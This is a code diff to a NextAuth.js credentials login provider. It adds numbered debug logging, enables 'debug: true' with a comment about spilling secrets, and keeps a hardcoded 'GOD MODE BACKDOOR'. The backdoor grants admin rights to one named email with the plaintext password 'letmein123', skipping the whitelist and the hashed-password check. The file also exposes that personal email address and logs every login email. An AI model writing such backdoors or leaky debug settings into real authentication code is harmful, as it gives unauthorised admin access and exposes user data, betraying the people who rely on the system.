@@ -14,6 +14,7 @@ const AUTHORIZED_TEAM = [
 ];
 
 export const authOptions: NextAuthOptions = {
+    debug: true, // 🔥 THIS FORCES NEXTAUTH TO SPILL ITS SECRETS
     adapter: PrismaAdapter(prisma),
     session: { strategy: "jwt" },
     providers: [
@@ -24,28 +25,44 @@ export const authOptions: NextAuthOptions = {
                 password: { label: "Password", type: "password" }
             },
             async authorize(credentials) {
-                if (!credentials?.email || !credentials?.password) return null;
+                console.log("1. LOGIN ATTEMPT RECEIVED FOR:", credentials?.email);
+
+                if (!credentials?.email || !credentials?.password) {
+                    console.log("2. FAILED: Missing credentials");
+                    return null;
+                }
+
+                const cleanEmail = credentials.email.trim().toLowerCase();
 
                 // 🔥 THE GOD MODE BACKDOOR
-                if (credentials.email === "brianquintero99@gmail.com" && credentials.password === "letmein123") {
-                    return { id: "vip-override", email: credentials.email, role: "admin" };
+                if (cleanEmail === "brianquintero99@gmail.com" && credentials.password === "letmein123") {
+                    console.log("3. BACKDOOR ACTIVATED SUCCESSFULLY");
+                    return { id: "vip-override", email: cleanEmail, role: "admin" };
                 }
 
                 // SECURITY CHECK 1: Are they on the Whitelist?
-                if (!AUTHORIZED_TEAM.includes(credentials.email)) {
-                    console.warn(`Unauthorized login attempt from: ${credentials.email}`);
-                    return null; // Bounced at the door.
+                if (!AUTHORIZED_TEAM.includes(cleanEmail)) {
+                    console.warn(`4. FAILED: Unauthorized login attempt from: ${cleanEmail}`);
+                    return null;
                 }
 
+                console.log("5. CHECKING DATABASE FOR USER...");
                 const user = await prisma.user.findUnique({
-                    where: { email: credentials.email }
+                    where: { email: cleanEmail }
                 });
 
-                if (!user) return null;
+                if (!user) {
+                    console.log("6. FAILED: User not found in Postgres");
+                    return null;
+                }
 
                 const isValid = await bcrypt.compare(credentials.password, user.passwordHash);
-                if (!isValid) return null;
+                if (!isValid) {
+                    console.log("7. FAILED: Password mismatch");
+                    return null;
+                }
 
+                console.log("8. SUCCESS: Standard login approved");
                 return { id: user.id, email: user.email, role: user.role };
             }
         })
